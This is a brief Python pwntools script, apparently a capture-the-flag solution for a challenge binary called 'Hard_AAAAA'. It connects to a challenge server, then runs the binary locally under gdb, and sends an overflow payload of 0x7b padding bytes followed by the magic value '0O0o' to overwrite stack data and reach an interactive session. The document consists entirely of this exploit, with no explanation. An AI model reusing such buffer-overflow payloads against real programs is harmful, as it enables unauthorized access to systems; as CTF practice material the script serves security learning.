from pwn import *
context.terminal=['tmux','splitw','-h']
p=remote("47.103.214.163","20000")
p=process("./Hard_AAAAA")
p.recv()
gdb.attach(p,"b*0x080485E9")
p.sendline("a"*0x7b+"0O0o\x00")

p.interactive()

